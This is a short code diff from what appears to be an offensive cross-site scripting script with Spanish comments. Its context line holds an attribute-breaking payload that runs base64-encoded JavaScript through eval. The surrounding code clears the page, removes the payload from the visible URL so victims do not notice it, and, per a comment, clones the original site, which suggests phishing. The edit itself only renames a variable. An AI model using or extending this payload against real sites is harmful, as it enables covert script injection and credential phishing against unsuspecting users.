@@ -5,7 +5,7 @@ var payload_vuln = "\"onload=\"eval(atob('Y29uc3Qgbm9kZSA9IGRvY3VtZW50LmNyZWF0ZU
 document.body.innerHTML = '';
 // Esto cambia la URL que muestra el navegador, para que no se vea el payload
 let newUrl = new URL(window.location.href)
-l_url.searchParams.set(param_vuln, '')
+newUrl.searchParams.set(param_vuln, '')
 history.pushState({ path: newUrl.href }, '', newUrl.href);
 
 //Clona la web original
